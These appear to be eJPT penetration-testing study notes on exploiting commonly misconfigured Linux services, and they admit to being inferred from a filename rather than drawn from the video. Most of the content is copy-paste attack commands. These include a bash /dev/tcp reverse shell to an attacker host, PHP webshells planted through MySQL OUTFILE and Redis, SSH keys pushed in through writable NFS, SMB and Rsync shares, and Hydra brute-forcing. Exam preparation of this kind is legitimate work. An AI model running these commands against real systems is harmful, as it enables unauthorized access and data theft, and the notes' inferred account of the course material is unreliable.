# 01 – Frequently Exploited Linux Services (eJPT) — Study Notes

Note: No transcript was provided. The following is a conservative, exam-focused summary inferred from the filename “01 – Frequently Exploited Linux Services” in the “01-LinuxVulnerabilities” folder. Commands and flows target common misconfigurations you’ll meet in eJPT-style labs.

## What the video covers (Introduction / big picture)

- The most commonly exposed and misconfigured Linux network services attackers target in internal/external assessments.
- How to enumerate, validate misconfigurations, and pivot to shell access using only standard tools.
- Focus on service-level weaknesses: anonymous access, default/weak credentials, world-writable shares/exports, remote file write leading to webshell/SSH, and informative leaks (SNMP/SMTP).
- Workflow-oriented: fast scanning → service fingerprinting → service-specific checks → low-hanging exploitation → shell.

Services emphasized:
- SSH (22), FTP (21), Telnet (23), SMTP (25), HTTP/HTTPS (80/443), SMB/Samba (445), NFS (2049), SNMP (161/udp), MySQL (3306), PostgreSQL (5432), Rsync (873), Redis (6379).

## Flow (ordered)

1. Recon and scanning
   - Discover hosts and open ports, capture versions with Nmap.
2. Prioritize by likelihood and impact
   - Anonymous or weakly authenticated services (FTP, SMB, Rsync), network filesystems (NFS), info leaks (SNMP/SMTP), high-surface web.
3. Service-specific enumeration
   - Use Nmap NSE and native clients (ftp, smbclient, showmount, snmpwalk, redis-cli, mysql).
4. Low-hanging exploits
   - Anonymous reads/writes, share/exports write to .ssh/authorized_keys, HTTP upload/LFI, Redis write-to-webroot, MySQL OUTFILE.
5. Credentials and reuse
   - Spray/bruteforce with care (Hydra), reuse across SSH/DB/web.
6. Shell and stabilization
   - Reverse shell via web or SSH with added key; stabilize TTY.
7. Looting and persistence (lab context)
   - Dump configs/creds, enumerate for privesc.

## Tools highlighted

- Scanning: nmap (NSE)
- General: netcat (nc), curl, wget
- Web: gobuster/ffuf, nikto, whatweb
- Auth attacks: hydra
- FTP: ftp/lftp, Nmap ftp-* scripts
- SMB/Samba: smbclient, smbmap, enum4linux-ng, rpcclient, Nmap smb-* scripts
- NFS: showmount, mount
- SNMP: snmpwalk/snmpbulkwalk (v1/v2c)
- SMTP: nc, Nmap smtp-* scripts, swaks
- Databases: mysql, psql
- Rsync: rsync
- Redis: redis-cli

## Typical command walkthrough (detailed, copy-paste friendly)

Setup environment variables for convenience:
```bash
export IP=10.10.10.10
export LHOST=10.10.14.14
export LPORT=4444
mkdir -p scans loot mounts
```

### 1) Recon and scanning
```bash
# All TCP ports, noisy but fast
nmap -p- -sS -n -Pn --min-rate 2000 -oA scans/alltcp $IP

# Parse open ports to a comma list
PORTS=$(awk -F/ '/open/{print $1}' scans/alltcp.nmap | paste -sd,)

# Service/version + default scripts on discovered ports
nmap -sCV -p"$PORTS" -oA scans/versions $IP

# Common UDP (SNMP, etc.)
nmap -sU -p 161,69,123,137,138 --top-ports 50 -oA scans/udp $IP
```

### 2) FTP (21) — anonymous access and file write
```bash
# NSE checks
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor $IP

# Try anonymous
ftp -inv $IP << 'EOF'
user anonymous anonymous@
pwd
ls -la
cd /
ls -la
get readme.txt
bye
EOF
```
- If writeable: attempt to upload test file, or target a user’s .ssh/authorized_keys via an accessible path.

### 3) SSH (22) — credential reuse, key-based auth
```bash
# Fast banner/version
nc -nv $IP 22 <<< ''

# Try known creds
# hydra example: replace userlist/passlist paths
hydra -L users.txt -P passwords.txt -t 4 ssh://$IP

# If you obtained a private key id_rsa:
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```

### 4) Telnet (23) — weak creds, banner info
```bash
nc -nv $IP 23
# Or brute-force with hydra (careful with lockouts)
hydra -L users.txt -P passwords.txt -t 4 telnet://$IP
```

### 5) SMTP (25) — user enumeration and info
```bash
# NSE
nmap -p25 --script smtp-commands,smtp-open-relay,smtp-enum-users $IP

# Manual VRFY
nc -nv $IP 25 << 'EOF'
HELO attacker
VRFY root
VRFY www-data
VRFY admin
QUIT
EOF

# swaks (if installed) to test relay
swaks --to test@example.com --from you@$IP --server $IP
```

### 6) HTTP/HTTPS (80/443) — content discovery, low-hanging vulns
```bash
# Quick tech fingerprint
whatweb http://$IP

# Directory bruteforce
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -o scans/gobuster.txt

# Nikto baseline
nikto -h http://$IP -o scans/nikto.txt

# Fetch interesting files
curl -i http://$IP/robots.txt
curl -i http://$IP/.git/HEAD   # if git exposed
```
- If file upload/LFI discovered, leverage to get a webshell or read local files.
- Reverse shell (example payloads): https://www.revshells.com

Listener and basic bash reverse shell:
```bash
# Listener
nc -lvnp $LPORT

# If you can execute OS commands on target (web or otherwise):
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1'
```

### 7) SMB/Samba (445) — anonymous shares, read/write
```bash
# NSE
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery $IP

# List shares (no password)
smbclient -L //$IP/ -N

# Map shares, show perms
smbmap -H $IP

# Access a share
smbclient //$IP/public -N -c "ls; lcd loot; prompt OFF; mget *"

# If writable, try placing an SSH authorized_keys for a user if home dirs are shared
# Example (update paths accordingly):
echo 'ssh-rsa AAAA... attacker@kali' > authorized_keys
smbclient //$IP/users -N -c "put authorized_keys user/.ssh/authorized_keys"
```

### 8) NFS (2049) — exported directories, write-to-SSH
```bash
# List exports
showmount -e $IP

# Mount an export (example /home)
sudo mount -t nfs -o vers=3 $IP:/home ./mounts/nfs

# Inspect permissions
ls -la mounts/nfs

# If you can write to a user home:
mkdir -p mounts/nfs/targetuser/.ssh
cat ~/.ssh/id_rsa.pub | tee mounts/nfs/targetuser/.ssh/authorized_keys
chmod 700 mounts/nfs/targetuser/.ssh
chmod 600 mounts/nfs/targetuser/.ssh/authorized_keys

# Then SSH in:
ssh targetuser@$IP
```
Note: Exploits relying on no_root_squash typically require additional foothold on the target; the authorized_keys write is the usual initial-access route.

### 9) SNMP (161/udp) — info leakage (processes, users, networks)
```bash
# Common community strings: public, private
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.1          # system info
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.1.6.0   # system processes
snmpwalk -v2c -c public $IP 1.3.6.1.4.1            # enterprises (often juicy)
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.4.20       # IP addresses
```
- Look for credentials in running process args, interface names, or descriptions.

### 10) MySQL (3306) — weak creds, file read/write
```bash
# NSE
nmap -p3306 --script mysql-info,mysql-databases,mysql-users,mysql-variables $IP

# Login (try empty or common)
mysql -h $IP -u root
# or
mysql -h $IP -u root -p

# Inside MySQL:
SHOW DATABASES;
SELECT LOAD_FILE('/etc/passwd');
SHOW VARIABLES LIKE 'secure_file_priv';
# If secure_file_priv allows or is NULL (unrestricted) and webroot is known:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### 11) PostgreSQL (5432) — weak creds, enumeration
```bash
# Try default user
psql -h $IP -U postgres
# Enumerate
\l
\du
\dt
```
Note: OS command execution typically needs superuser; you’ll mostly loot data or creds.

### 12) Rsync (873) — anonymous modules and write
```bash
# List modules
rsync -av --list-only rsync://$IP/

# Enumerate a module
rsync -av --list-only rsync://$IP/public

# Pull data
rsync -av rsync://$IP/public ./loot/rsync_public

# If writable, try pushing authorized_keys into a user home module
rsync -av ~/.ssh/id_rsa.pub rsync://$IP/home/targetuser/.ssh/authorized_keys
```

### 13) Redis (6379) — unauthenticated access, write-to-webroot/authorized_keys
```bash
# Test auth
redis-cli -h $IP ping
redis-cli -h $IP CONFIG GET requirepass

# If no auth and webroot path is known/writeable by redis:
# Create a simple webshell payload file locally
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

# Set Redis DB dir and filename to webroot
redis-cli -h $IP CONFIG SET dir /var/www/html
redis-cli -h $IP CONFIG SET dbfilename shell.php

# Store payload as a key then save to disk
redis-cli -h $IP -x SET payload < shell.php
redis-cli -h $IP SAVE
# Access: http://$IP/shell.php?cmd=id

# Alternatively, write SSH authorized_keys (if Redis can write to user home)
mkdir -p tmp_redis && (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > tmp_redis/ak
redis-cli -h $IP CONFIG SET dir /home/targetuser/.ssh
redis-cli -h $IP CONFIG SET dbfilename authorized_keys
redis-cli -h $IP -x SET foo < tmp_redis/ak
redis-cli -h $IP SAVE
```

## Practical tips

- Always save Nmap outputs (-oA) for later reference and reporting.
- Use Nmap NSE targeted at detected services; it often finds anonymous access or defaults instantly.
- Start with read-only anonymous access; escalate to write attempts only when indicated by perms.
- Credential reuse is common: try discovered creds across SSH/FTP/SMB/DB.
- For web, basic content discovery (gobuster) and default creds on admin panels are frequent wins.
- SNMP leaks are gold: processes may include passwords in command lines.
- When writing authorized_keys, ensure correct perms: .ssh 700, authorized_keys 600.
- Reverse shell reliability: prefer standard bash or PHP one-liners; match firewall-friendly ports (443/53).
- Be gentle with bruteforce; low threads and short lists avoid lockouts and noise.

## Minimal cheat sheet (one-screen flow)

```bash
# Recon
IP=10.10.10.10; LHOST=10.10.14.14; LPORT=4444
nmap -p- -sS -n -Pn --min-rate 2000 -oA scans/alltcp $IP
PORTS=$(awk -F/ '/open/{print $1}' scans/alltcp.nmap | paste -sd,)
nmap -sCV -p"$PORTS" -oA scans/versions $IP
nmap -sU -p161 -oA scans/snmp $IP

# FTP
nmap -p21 --script ftp-anon $IP
ftp -inv $IP

# SMB
nmap -p445 --script smb-enum-shares,smb-enum-users $IP
smbclient -L //$IP/ -N
smbmap -H $IP

# NFS
showmount -e $IP
sudo mount -t nfs -o vers=3 $IP:/home mounts/nfs
# write id_rsa.pub to mounts/nfs/user/.ssh/authorized_keys

# SNMP
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.1
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.1.6.0

# HTTP
whatweb http://$IP
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h http://$IP
nc -lvnp $LPORT  # listener

# SMTP
nmap -p25 --script smtp-commands,smtp-enum-users $IP
nc -nv $IP 25

# MySQL
nmap -p3306 --script mysql-info $IP
mysql -h $IP -u root -p

# Rsync
rsync -av --list-only rsync://$IP/
rsync -av rsync://$IP/public ./loot/rsync_public

# Redis
redis-cli -h $IP ping
redis-cli -h $IP CONFIG GET requirepass
```

## Summary

- This module introduces the Linux services you’re most likely to exploit in eJPT labs: FTP, SSH, SMB/Samba, NFS, SNMP, SMTP, HTTP, MySQL/PostgreSQL, Rsync, Redis.
- The winning strategy: do solid enumeration with Nmap/NSE, then run quick, deterministic checks per service for anonymous access, default creds, and remote write paths.
- Turn write access into shells by dropping SSH keys or webshells. Use info leakage (SNMP/SMTP) to guide credential guesses and lateral movement.
- Keep it simple and reliable; prioritize misconfigurations over complex exploits.